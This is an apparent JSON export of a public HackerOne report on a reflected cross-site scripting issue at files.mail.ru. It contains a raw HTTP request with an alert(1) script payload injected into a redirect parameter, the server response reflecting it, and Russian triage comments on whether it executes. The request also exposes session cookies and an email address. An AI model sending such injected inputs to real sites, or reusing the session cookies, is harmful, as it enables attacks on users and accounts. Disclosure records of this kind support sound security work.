{"id":13313,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzMxMw==","url":"https://hackerone.com/reports/13313","title":"files.mail.ru: XSS","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-05-25T16:39:59.247Z","submitted_at":"2014-05-25T16:39:59.247Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"isox","url":"/isox","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/006/507/53ee156fd5b0b3b9a7bbc254dad1b482e30537ff_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":65,"url":"https://hackerone.com/mailru","handle":"mailru","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Mail.ru","twitter_handle":"mailru","website":"https://corp.mail.ru","about":"Building the Internet since 1998"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-09-13T12:03:42.973Z","bug_reporter_agreed_on_going_public_at":"2015-08-21T08:43:11.525Z","team_member_agreed_on_going_public_at":"2015-09-13T12:03:42.553Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"GET /rus?back=391a1\u003chtml\u003e\u003cscript\u003ealert(1)\u003c%2fscript\u003e\u003c/html\u003e\u003c!-- HTTP/1.1\r\nHost: files.mail.ru\r\nAccept: */*\r\nAccept-Language: en\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\r\nConnection: close\r\nReferer: http://files.mail.ru/cgi-bin/files/fupload\r\nCookie: flsmlrur=0f93960946c6fb1b05366d6771c76fa3; flsmlrua=89caf034e9571bb5e7606cec2bf9d7ef; p=b0kAAEt9twAA; mref=http://my.mail.ru/video/top; mrcu=A6505381CD6669AD68F68DC71B5F; searchuid=1527834891401015703; HTML5Uploader=2; gmt=4; posts_subscriptions=isox@inbox.ru; VID=0Mm8Po3iv9HE:; _ga=GA1.2.49844597.1401016323; t=obLD1AAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAQAAACAAAQCuwcA; current-page=month; mr1ladid=1_1000000_1000164_0; sdc=ZkNtEiOYcuxI9KMD; Mpop=1401016718:767444037873097519050219081d000c1c0c054f6a5d5e465e030307071d01017518584a564010595f555a4f1b4341:isox@inbox.ru:; c=69GBUwEAAJoEAAAkAAAACQAg; statistics=sub%3Aplay%3Aauditory%3Aauditory_v1%3Atargeting; s=s_vp=(2560/1279)|fver=13|dpr=1; _ym_visorc_9569476=w; __utma=41676084.49844597.1401016323.1401016976.1401016976.1; __utmb=41676084.1.10.1401016976; __utmc=41676084; __utmz=41676084.1401016976.1.1.utmcsr=my.mail.ru|utmccn=(referral)|utmcmd=referral|utmcct=/my/userinfo; mc1=1401016982; i=AQCizYFTBQATAAgKA0IBAdwEAfQEAagACAcCBQABvgABqgAIBwIFAAG+AAHvAQgEAQEAASoCBQIBAA==\r\n\r\n\r\n\r\nHTTP/1.1 302 Found\r\nServer: nginx\r\nDate: Sun, 25 May 2014 16:39:08 GMT\r\nContent-Type: text/html; charset=utf-8\r\nConnection: close\r\nSet-Cookie: flsmlrua=89caf034e9571bb5e7606cec2bf9d7ef; path=/; expires=Sun, 01 Jun 2014 16:39:08 GMT; domain=.files.mail.ru\r\nCache-Control: must-revalidate, post-check=0, pre-check=0\r\nLocation: http://files.mail.ru:80391a1\u003chtml\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u003c/html\u003e\u003c!--\r\nExpires: Thu, 01 Jan 1970 00:00:01 GMT\r\nContent-Length: 401\r\n\r\nStatus: 302 Found\r\nLocation: http://files.mail.ru:80391a1\u003chtml\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u003c/html\u003e\u003c!--\r\nContent-Type: text/html\r\n\r\n\u003c!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"\u003e\r\n\u003cHTML\u003e\u003cHEAD\u003e\r\n\u003cTITLE\u003e302 Found\u003c/TITLE\u003e\r\n\u003c/HEAD\u003e\u003cBODY\u003e\r\n\u003cH1\u003eFound\u003c/H1\u003e\r\nThe document has moved \u003cA HREF=\"http://files.mail.ru:80391a1\u0026lt;html\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026lt;/html\u0026gt;\u0026lt;!--\"\u003ehere\u003c/A\u003e.\u003cP\u003e\r\n\u003c/BODY\u003e\u003c/HTML\u003e\r\n\r\n\r\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-09-20T08:43:12.366Z","allow_singular_disclosure_after":-191220907.60309958,"singular_disclosure_allowed":true,"vote_count":1,"voters":["w2w"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":57368,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Спасибо за ваш репорт.  Мы ценим ваше желание сделать наши сервисы ещё безопаснее.\n\nПрисланная вами информация передана аналитикам и проверяется, мы обязательно свяжемся с вами в ближайшее время.","automated_response":false,"created_at":"2014-05-26T10:25:12.576Z","updated_at":"2014-05-26T10:25:12.576Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":59522,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"Спасибо за ваш репорт.  Мы ценим ваше желание сделать наши сервисы ещё безопаснее.\n\nК сожалению, мы не можем подтвердить ваш репорт как уязвимость информационной безопасности. Скорее всего, это отчёт автоматического сканера безопасности. Если вы считаете что мы не правы, предоставьте пожалуйста рабочий PoC для этой уязвимости.\n\nP.S. тег баунсится в Location:, к выполнению скрипта это не приводит.","automated_response":false,"created_at":"2014-05-28T11:52:37.974Z","updated_at":"2014-05-28T11:52:37.974Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":59530,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"OD OA 0D 0A после строки Content-Length: 401\nПосле этого идет Status: 302 Found\nLocation: http://files.mail.ru:80391a1\u003chtml\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u003c/html\u003e\u003c!--\nContent-Type: text/html\n\n\u003c!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"\u003e\n\u003cHTML\u003e\u003cHEAD\u003e\n\u003cTITLE\u003e302 Found\u003c/TITLE\u003e\n\u003c/HEAD\u003e\u003cBODY\u003e\n\u003cH1\u003eFound\u003c/H1\u003e\nThe document has moved \u003cA HREF=\"http://files.mail.ru:80391a1\u0026lt;html\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026lt;/html\u0026gt;\u0026lt;!--\"\u003ehere\u003c/A\u003e.\u003cP\u003e\n\u003c/BODY\u003e\u003c/HTML\u003e\n\nРазве в парсинг не пойдет?\n","automated_response":false,"created_at":"2014-05-28T12:04:48.670Z","updated_at":"2014-05-28T12:04:48.670Z","actor":{"username":"isox","cleared":false,"url":"/isox","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/507/53ee156fd5b0b3b9a7bbc254dad1b482e30537ff_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":59555,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"А, я думал\n\nStatus: 302 Found\nLocation: http://files.mail.ru:80391a1\u003chtml\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u003c/html\u003e\u003c!--\nContent-Type: text/html\n\nэто сканер сводку по заголовкам написал.\nВ парсинг ничего не пойдет из-за 302 и Location:, причем в запросе нормального браузера все что в URL будет в percent-encode, т.е. заскриптить все равно не получится. Но можно попробовать заэксплоитить старый IE настроенный на выдачу серверной ошибки (по умолчанию он показывает свою), превысив в нем максимально допустимое количество редиректов.\n","automated_response":false,"created_at":"2014-05-28T12:40:59.311Z","updated_at":"2014-05-28T12:40:59.311Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":59557,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2014-05-28T12:41:25.759Z","updated_at":"2014-05-28T12:41:25.759Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":59569,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"В общем, мутная фигня )))","automated_response":false,"created_at":"2014-05-28T12:51:34.011Z","updated_at":"2014-05-28T12:51:34.011Z","actor":{"username":"isox","cleared":false,"url":"/isox","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/507/53ee156fd5b0b3b9a7bbc254dad1b482e30537ff_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":106521,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Привет,\nмы пофиксили баг. Пожалуйста проверьте, что проблема больше не воспроизводится.\n\nК сожалению, баг не входит в область действия программы денежного вознаграждения за найденные уязвимости, но мы искренне признательны вам за то, что вы сообщили о нем и помогли нам стать чуть-чуть лучше.","automated_response":false,"created_at":"2014-08-13T10:43:09.119Z","updated_at":"2014-08-13T10:43:09.119Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"isox","url":"/isox"},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":557201,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi! Just wanted to disclose my bugs.\nIf you think that this ticket must stay private - not a problem, I will cancel disclosure :)","automated_response":false,"created_at":"2015-08-21T08:43:11.558Z","updated_at":"2015-08-21T08:43:11.558Z","first_to_agree":true,"actor":{"username":"isox","cleared":false,"url":"/isox","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/507/53ee156fd5b0b3b9a7bbc254dad1b482e30537ff_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":586798,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-09-13T12:03:42.591Z","updated_at":"2015-09-13T12:03:42.591Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":586799,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-09-13T12:03:43.000Z","updated_at":"2015-09-13T12:03:43.000Z","actor":{"username":"valievkarim","cleared":false,"url":"/valievkarim","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/153/860a975b9fdb2c80f4c2f4cfda2388c043d450a0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":716852,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","automated_response":false,"created_at":"2015-12-11T11:23:11.282Z","updated_at":"2015-12-11T11:23:11.282Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Mail.ru"}},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}